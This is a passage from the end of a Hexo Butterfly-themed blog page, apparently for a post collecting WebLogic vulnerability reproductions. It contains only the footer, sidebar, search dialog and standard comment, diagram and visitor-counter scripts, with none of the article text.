href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By <i id="heartbeat" class="fa fas fa-heartbeat"></i>sh@rp</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">build with love</div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaidWrap.length) {
+    window.runMermaid = () => {
+      window.loadMermaid = true
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+      Array.from($mermaidWrap).forEach((item, index) => {
+        const mermaidSrc = item.firstElementChild
+        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+        const mermaidID = 'mermaid-' + index
+        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
+        })
+      })
+    }
+
+    const loadMermaid = () => {
+      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+    }
+
+    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'WskQ6716WawpeVqRaU0LAwqR-gzGzoHsz',
+      appKey: '27h76RwyIhyB3XAO5S3RDPEQ',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://sharpa.cn/2022/04/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/'
+    this.page.identifier = '2022/04/26/Weblogic漏洞复现合集/'
+    this.page.title = 'Weblogic漏洞复现合集'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
